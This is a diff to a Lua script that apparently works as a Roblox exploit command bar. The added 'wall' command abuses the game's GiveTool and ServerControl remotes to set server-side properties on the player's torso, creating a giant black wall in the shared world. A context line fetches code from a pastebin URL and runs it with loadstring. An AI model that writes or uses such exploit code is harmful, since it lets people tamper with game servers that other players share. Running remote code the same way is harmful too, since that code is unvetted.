@@ -1352,6 +1352,35 @@ MainUserP:GetMouse().Button1Down:Connect(function()
 	end
 end)
 	end
+	
+	    if string.sub(cmdbar.Text,1,4) == "wall" or string.sub(cmdbar.Text,1,5) == prefix.."wall" then
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local mesh = 1107038050
+local texture = 4455434349 
+local CE = {}
+local Variables = {
+    workspace = game:GetService("Workspace"),
+    players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Anchored",true)
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"BrickColor",BrickColor.new(0, 0, 0))
+wait(.01)
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Size",Vector3.new(300,300,0.5))
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Parent",Workspace)
+end
 
 	if string.sub(cmdbar.Text,1,2) == "iy" or string.sub(cmdbar.Text,1,3) == prefix.."iy" then
 		loadstring(game:HttpGet("https://pastebin.com/raw/tzTXmYf2", true))()
